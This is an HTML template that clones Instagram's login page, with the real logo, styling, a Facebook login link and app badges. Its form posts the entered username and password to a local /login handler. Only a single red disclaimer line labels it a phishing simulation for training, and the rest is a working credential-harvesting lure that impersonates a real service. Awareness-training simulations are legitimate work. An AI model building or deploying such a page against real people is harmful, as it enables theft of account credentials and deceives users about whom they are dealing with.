<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: Arial, sans-serif;
      margin: 0;
    }
    .wrapper {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
    }
    .login-container {
      max-width: 350px;
      width: 100%;
      border: 1px solid #dbdbdb;
      background-color: #fff;
      padding: 40px 40px 20px;
      text-align: center;
      margin-bottom: 20px;
    }
    .logo img {
      width: 175px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
    }
    button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      background-color: #3897f0;
      border: none;
      border-radius: 3px;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    .divider {
      margin: 20px 0;
      text-align: center;
      color: #8e8e8e;
      font-size: 13px;
    }
    .fb-login {
      background-color: #4267b2;
      text-decoration: none;
      display: inline-block;
      color: white;
      padding: 10px;
      border-radius: 3px;
      font-weight: bold;
    }
    .error-message {
      color: #ed4956;
      margin-bottom: 10px;
      font-size: 14px;
    }
    .disclaimer {
      margin-top: 20px;
      font-size: 12px;
      color: red;
    }
    .get-app {
      text-align: center;
      font-size: 14px;
      color: #262626;
    }
    .app-badges {
      margin-top: 10px;
      display: flex;
      justify-content: center;
      gap: 10px;
    }
    .app-badges img {
      height: 40px;
    }

    @media(min-width: 768px) {
      .wrapper {
        margin-top: 50px;
      }
      .login-container {
        max-width: 400px;
        padding: 50px;
      }
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="login-container">
      <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="Instagram Logo">
      </div>
      {% if error %}
        <div class="error-message">{{ error }}</div>
      {% endif %}
      <form action="/login" method="POST">
        <input type="text" name="email" placeholder="Phone number, username, or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
      </form>
      <div class="divider">OR</div>
      <a class="fb-login" href="https://www.facebook.com/login/" target="_blank">Log in with Facebook</a>
      <div class="disclaimer">
        ⚠️ This is a phishing simulation for training. Do not enter real credentials.
      </div>
    </div>
    <div class="get-app">
      Get the app.
      <div class="app-badges">
        <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
          <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
        </a>
        <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank">
          <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Download_on_the_App_Store_Badge.svg" alt="Download on the App Store">
        </a>
      </div>
    </div>
  </div>
</body>
</html>
